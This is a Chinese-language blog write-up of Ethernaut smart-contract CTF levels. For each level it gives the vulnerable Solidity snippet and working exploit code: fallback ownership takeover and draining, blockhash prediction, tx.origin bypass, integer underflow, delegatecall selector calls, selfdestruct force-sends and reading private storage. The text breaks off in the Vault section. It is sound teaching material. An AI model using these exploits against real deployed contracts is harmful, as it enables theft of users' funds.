<!DOCTYPE html>





  


<html class="theme-next pisces use-motion" lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="安全,Ethernaut,WriteUp,solidity," />










<meta name="description" content="Zeppelin-Ethernaut-WriteUp参考文章：感谢大佬 xuing Ethernaut WriteUp 更新到22题 Shop 本文单纯记录下自己的学（mo）习（yu）过程。 Hello Ethernaut第一关很简单，首先是教你如何去使用MetaMask浏览器扩展程序。 使用基础命令查看信息：  player ：查看自己的地址。  getBalance(player) ：查看当前">
<meta name="keywords" content="安全,Ethernaut,WriteUp,solidity">
<meta property="og:type" content="article">
<meta property="og:title" content="Ethernaut WriteUp">
<meta property="og:url" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;index.html">
<meta property="og:site_name" content="Just for fun.">
<meta property="og:description" content="Zeppelin-Ethernaut-WriteUp参考文章：感谢大佬 xuing Ethernaut WriteUp 更新到22题 Shop 本文单纯记录下自己的学（mo）习（yu）过程。 Hello Ethernaut第一关很简单，首先是教你如何去使用MetaMask浏览器扩展程序。 使用基础命令查看信息：  player ：查看自己的地址。  getBalance(player) ：查看当前">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img7.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img8.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img1.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img2.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img3.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img5.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img6.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img4.png">
<meta property="og:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img9.png">
<meta property="og:updated_time" content="2019-11-22T09:13:59.553Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http:&#x2F;&#x2F;hxzy.me&#x2F;2019&#x2F;11&#x2F;09&#x2F;Ethernaut%20WriteUp&#x2F;img7.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://hxzy.me/2019/11/09/Ethernaut WriteUp/"/>





  <title>Ethernaut WriteUp | Just for fun.</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Just for fun.</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">菜得真实</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://hxzy.me/2019/11/09/Ethernaut%20WriteUp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="hxzy">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Just for fun.">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Ethernaut WriteUp</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建时间" itemprop="dateCreated datePublished" datetime="2019-11-09T11:11:11+08:00">
                2019-11-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/" itemprop="url" rel="index">
                    <span itemprop="name">区块链</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv">本文总阅读量
            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="post.wordcount">
                  9.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="post.min2read">
                  38 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="Zeppelin-Ethernaut-WriteUp"><a href="#Zeppelin-Ethernaut-WriteUp" class="headerlink" title="Zeppelin-Ethernaut-WriteUp"></a><a href="https://ethernaut.openzeppelin.com/" target="_blank" rel="noopener">Zeppelin-Ethernaut</a>-WriteUp</h1><p>参考文章：感谢大佬 <a href="https://www.jianshu.com/u/2631d3e59e33" target="_blank" rel="noopener">xuing</a></p>
<p><a href="https://www.jianshu.com/p/161d554a591c" target="_blank" rel="noopener">Ethernaut WriteUp 更新到22题 Shop</a></p>
<p>本文单纯记录下自己的学（mo）习（yu）过程。</p>
<h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2><p>第一关很简单，首先是教你如何去使用<a href="https://metamask.io/" target="_blank" rel="noopener">MetaMask浏览器扩展程序</a>。</p>
<p>使用基础命令查看信息：</p>
<ul>
<li><p>player ：查看自己的地址。</p>
</li>
<li><p>getBalance(player) ：查看当前的以太币余额。</p>
</li>
<li><p>contract.abi() ：查看合约接口，即可以调用的函数。</p>
</li>
<li><p>help() ：查看控制台中其他可用命令。</p>
</li>
</ul>
<p>解题：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract.info()</span><br><span class="line">// &quot;You will find what you need in info1().&quot;</span><br><span class="line">contract.info1()</span><br><span class="line">// &quot;Try info2(), but with &quot;hello&quot; as a parameter.&quot;</span><br><span class="line">contract.info2(&apos;hello&apos;)</span><br><span class="line">// &quot;The property infoNum holds the number of the next info method to call.&quot;</span><br><span class="line">contract.infoNum()</span><br><span class="line">// 42</span><br><span class="line">contract.info42()</span><br><span class="line">// &quot;theMethodName is the name of the next method.&quot;</span><br><span class="line">contract.theMethodName()</span><br><span class="line">// &quot;The method name is method7123949.&quot;</span><br><span class="line">contract.method7123949()</span><br><span class="line">// &quot;If you know the password, submit it to authenticate().&quot;</span><br><span class="line">contract.abi</span><br><span class="line">//查看合约接口，寻找password，发现存在一个名为password的函数</span><br><span class="line">contract.password()</span><br><span class="line">// &quot;ethernaut0&quot;</span><br><span class="line">contract.authenticate(&apos;ethernaut0&apos;)</span><br></pre></td></tr></table></figure>

<p>点击Submit instance，第一关over。</p>
<p>关键：</p>
<ul>
<li>contract.functionName() 调用合约函数</li>
<li>contract.abi 查看函数接口</li>
</ul>
<h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>通关要求：</p>
<ul>
<li><p>获得合约所有权</p>
</li>
<li><p>将合余额减少为0</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//withdraw函数是只能由合约拥有者才能访问的，功能是取出合约内部全部资金</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line">//fallback函数，获得合约所有权</span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//保证在执行fallBack函数时，能通过contributions[msg.sender] &gt; 0的校验</span><br><span class="line">contract.contribute(&#123;value:1&#125;)  </span><br><span class="line">//通过转账调用fallback函数。</span><br><span class="line">contract.sendTransaction(&#123;value:1&#125;)</span><br><span class="line">//将合约中的钱，全部收入囊中。</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>fallback函数：<ul>
<li>没有名字，不能有参数，没有返回值</li>
<li>当调用的函数找不到时，就会调用默认的fallback函数 </li>
<li>当我们使用<code>address.send(ether to send)</code>向某个合约直接转帐时，由于这个行为没有发送任何数据，所以接收合约总是会调用fallback函数 </li>
</ul>
</li>
</ul>
<h2 id="Fallout"><a href="#Fallout" class="headerlink" title="Fallout"></a>Fallout</h2><p>通过要求：</p>
<ul>
<li>获取合约所有权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/* constructor */</span><br><span class="line">function Fal1out() public payable &#123;</span><br><span class="line">  owner = msg.sender;</span><br><span class="line">  allocations[owner] = msg.value;</span><br><span class="line">&#125;</span><br><span class="line">//具有误导作用的constructor，仔细看会发现该函数并非构造函数，其名字中有个1</span><br></pre></td></tr></table></figure>

<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure>

<p>就是这么简单！</p>
<p>关键：</p>
<ul>
<li>构造函数<ul>
<li>0.4.22之前的版本  使用合约名来作为构造函数     function Fallout(){}</li>
<li>在0.4.22版本以及之后版本，构造函数使用  constructor() public{ }来定义</li>
<li>使用function定义构造函数，如果函数名出错，会导致本应是构造函数的函数变成一般函数，从而导致用户意外调用该函数，造成严重后果</li>
</ul>
</li>
</ul>
<p>危害详情见：<a href="https://paper.seebug.org/630/" target="_blank" rel="noopener">从以太坊”MorphToken事件”看智能合约构造函数大小写编码错误漏洞</a></p>
<h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>通关条件：</p>
<ul>
<li>连续猜对10次硬币翻转结果</li>
</ul>
<p>很明显，直接调用函数去猜测成功率接近0，所以我们需要使用合约来获取结果，然后将正确结果传入题目合约。</p>
<p>解题：</p>
<p>POC1（抄的大佬的，2333333）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.18 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./CoinFlip.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CoinFlipPoc &#123;</span><br><span class="line">  CoinFlip expFlip;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"> </span><br><span class="line">  constructor (address aimAddr) public &#123;</span><br><span class="line">    expFlip = CoinFlip(aimAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool guess = coinFlip == 1 ? true : false;</span><br><span class="line">    expFlip.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SafeMath.sol的一个GitHub地址：<br><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol" target="_blank" rel="noopener">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol</a></p>
<p>直接复制一份题目源码，新建一个名为CoinFlip.sol的文字，粘贴进去。</p>
<p>需要注意的就是solidity版本，有些SafeMath.sol使用的是0.5.0版本，所以需要修改一下CoinFlip.sol中的版本。</p>
<p>由于每次猜测都做了if (lastHash == blockValue) 判断，所以我们猜测一次后需要等到新区块生成后进行下一次猜测，不能使用for循环进行自动猜测。</p>
<p>POC2（给大佬跪了，还是抄的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">let blockHash = function() &#123;</span><br><span class="line">  return new Promise(</span><br><span class="line">    (resolve, reject) =&gt; web3.eth.getBlock(&apos;latest&apos;, (error, result) =&gt; &#123;</span><br><span class="line">      if(!error)</span><br><span class="line">          resolve(result[&apos;hash&apos;]);</span><br><span class="line">      else</span><br><span class="line">          reject(error);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract.flip(parseInt((await blockHash())[2], 16) &gt; 8)</span><br></pre></td></tr></table></figure>

<p>这种方式就不需要再去部署合约，直接在控制面版进行操作！妙啊！这就是大佬和我的区别啊！</p>
<p>使用 contract.consecutiveWins() 可以查看连胜次数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract.consecutiveWins()</span><br><span class="line">  Promise &#123;&lt;pending&gt;&#125;</span><br><span class="line">	__proto__: Promise</span><br><span class="line">  	  [[PromiseStatus]]: &quot;resolved&quot;</span><br><span class="line">	  [[PromiseValue]]: t</span><br><span class="line">		c: [5] //此处数字代表猜对次数</span><br><span class="line">		e: 0</span><br><span class="line">		s: 1</span><br><span class="line">	  __proto__: Object</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>block.blockhash (function(uint) returns (bytes32)):指定块的哈希值—— 仅可用于最新的 256 个区块且不包括当前区块  <ul>
<li>0.4.22  版本开始已不推荐使用 ，由 blockhash(uint blockNumber) 代替</li>
</ul>
</li>
</ul>
<h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>通关条件：</p>
<ul>
<li>获得合约所有权</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (tx.origin != msg.sender) &#123;</span><br><span class="line">	owner = _owner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由上面代码可以知道，获取所有权很简单，只要tx.origin不等于msg.sender就行。</p>
<p>简单来说就是我们调用一个合约，在由这个合约来调用题目合约。</p>
<p>POC（一个字，抄！）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.18 &lt;0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Telephone.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TelephonePoc &#123;</span><br><span class="line">    </span><br><span class="line">    Telephone phone;</span><br><span class="line">    </span><br><span class="line">    function TelephonePoc(address aimAddr) public &#123;</span><br><span class="line">        phone = Telephone(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function attack(address _owner) public&#123;</span><br><span class="line">        phone.changeOwner(_owner);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>tx.origin &amp; msg.sender<ul>
<li>使用tx.origin的所有者永远不可能是一个合约</li>
<li>使用msg.sender的所有者可能是一个合约</li>
<li>在D -&gt; C -&gt; B -&gt; A 的简单调用链上，D为tx.origin，而B为msg.sender</li>
</ul>
</li>
<li>可能导致钓鱼攻击</li>
</ul>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>通关条件：</p>
<ul>
<li>获取超乎想象的token</li>
</ul>
<p>uint类型，没有使用SafeMath，存在溢出漏洞。</p>
<p>初始状态有20个token，向外发送21个token，即可触发向下溢出漏洞。</p>
<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">contract.transfer(_address,21)</span><br><span class="line">//随便填一个地址，只要不是自己的就行</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(await contract.balanceOf(player)).toNumber() </span><br><span class="line">//查看player的token余额</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>溢出漏洞<ul>
<li>加法溢出</li>
<li>减法溢出</li>
<li>乘法溢出</li>
<li>使用SafeMath避免溢出漏洞</li>
</ul>
</li>
</ul>
<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>通关条件：</p>
<ul>
<li>​    获取合约所有权</li>
</ul>
<p>​    起初以为只要把 pwn() 作为data传给Delegation就可以让它的fallback函数调用Delegate的pwn函数，事实证明，我还是too young,too simple!</p>
<p>然鹅，大佬是这样操作的：web3.sha3(“pwn()”).slice(0,10)。</p>
<p>思考了都没有结果，Google也没找到原因。</p>
<p>直到看到官方文档中的：</p>
<blockquote>
<p> solidity官方文档</p>
<p> 一个函数调用数据的前 4 字节，指定了要调用的函数。这就是某个函数签名的 Keccak（SHA-3）哈希的前 4 字节（高位在左的大端序）（译注：这里的“高位在左的大端序“，指最高位字节存储在最低位地址上的一种串行化编码方式，即高位字节在左） </p>
</blockquote>
<p>​    这才明白了web3.sha3(“pwn()”).slice(0,10)这一连串操作是在干什么。（果然还是我太菜了！）</p>
<p>​    经过sha3加密的pwn()变成了一串16进制数，它的前4个字节就能代表pwn()这个函数，又由于前两个字符是0x,且16进制一位就是4位，所以4个字节等于32位，我们需要的字符数就是8+2=10，所以使用slice(0,10)来截取前10个字符，去掉0x,就是我们需要的函数签名的sha-3的前四字节。</p>
<p>​    将这个字节通过data传给合约，即可实现调用pwn()，完成！</p>
<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//sha3的返回值前两个为0x，所以要切0-10个字符。</span><br><span class="line">contract.sendTransaction(&#123;data: web3.sha3(&quot;pwn()&quot;).slice(0,10)&#125;);</span><br></pre></td></tr></table></figure>

<p>关键：</p>
<ul>
<li>1个字节=8位=16进制中的2个字符</li>
<li>ABI说明文档中规定，一个函数调用数据的前4字节，指定了要调用的函数。</li>
</ul>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>通关目标：</p>
<ul>
<li>​    使合约余额大于0</li>
</ul>
<p>​    通过观察可以发现，题目合约中代码真可爱！（其实就是啥都没有！）</p>
<p>​    这个时候就要复习一下向合约发送ether的方法了</p>
<ul>
<li><p>调用payable标识的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract supportPay&#123;</span><br><span class="line">  function deposit() payable&#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//直接调用deposit()</span><br><span class="line">//通过address.call(某个方法).value(要发送的ether)来实现的</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>使用send直接向某地址转账: address.send(ether to send)</p>
</li>
<li><p>利用selfdestruct将自身所有ether发送给目标地址： selfdestruct(address);  </p>
<p>因为目标合约没有任何能够接收ether的函数，所以我们只能强制将ether传入合约。</p>
</li>
</ul>
<p>Poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Force &#123;</span><br><span class="line">    function Force() payable public &#123;        </span><br><span class="line">    &#125;</span><br><span class="line">    function ForceSendEther(address _addr) payable public&#123;</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上不止这一种方法，还有：</p>
<ul>
<li>创建前预先发送ether</li>
<li>为其挖矿</li>
</ul>
<p>关键：</p>
<p>​    强制发送ether的集中方式：</p>
<ul>
<li>通过自毁</li>
<li>创建前预先发送ether</li>
<li>挖矿</li>
</ul>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>通关条件：</p>
<ul>
<li>解锁保险库</li>
</ul>
<p>​    查看源码可以发现调用 unlock函数并且输入正确的密码即可解锁。</p>
<p>​    由于合约中的所有内容对用户来说都是可见的，所以密码也应该是我们能访问到的。</p>
<p>​    下面是大佬们的POC。</p>
<p>​    Poc1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y)&#123;alert(web3.toAscii(y))&#125;);</span><br></pre></td></tr></table></figure>

<p>​    Poc2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function getStorageAt (address, idx) &#123;</span><br><span class="line">  return new Promise (function (resolve, reject) &#123;</span><br><span class="line">    web3.eth.getStorageAt(address, idx, function (error, result) &#123;</span><br><span class="line">      if (error) &#123;</span><br><span class="line">        reject(error);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        resolve(result);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)&#125;</span><br><span class="line"></span><br><span class="line">await getStorageAt(instance, 1);</span><br></pre></td></tr></table></figure>

<p>​    然后我们就可以得到密码： ”A very strong secret password :)“ </p>
<p>解题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">contract.unlock(&quot;A very strong secret password :)&quot;)</span><br></pre></td></tr></table></figure>

<p>​    通关后可以看到一些有用的信息</p>
<blockquote>
<p>重要的是要记住，将变量标记为私有只会阻止其他合同访问它。标记为私有变量和局部变量的状态变量仍可公开访问。</p>
<p>为了确保数据是私有的，在将数据放入区块链之前需要对其进行加密。在这种情况下，解密密钥绝不应该在链上发送，因为寻找密钥的任何人都可以看到它。<a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/" target="_blank" rel="noopener">zk-SNARK</a>提供了一种确定某人是否拥有秘密参数的方法，而不必揭露该参数。</p>
</blockquote>
<p>关键：</p>
<ul>
<li>将变量标记为私有只会阻止其他合同访问它。标记为私有变量和局部变量的状态变量仍可公开访问。</li>
